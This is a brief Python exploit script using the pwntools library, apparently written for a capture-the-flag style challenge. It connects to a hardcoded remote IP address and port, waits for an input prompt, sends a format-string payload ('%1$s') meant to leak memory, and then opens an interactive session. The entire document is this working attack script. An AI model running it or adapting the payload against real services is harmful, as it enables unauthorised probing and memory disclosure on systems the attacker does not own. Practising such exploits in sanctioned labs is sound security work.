from pwn import *
HOST="18.226.103.146"
PORT=9002
r=remote(HOST,PORT)
r.recvuntil(b"Input: ")
payload=b"%1$s"
r.sendline(payload)
r.interactive()
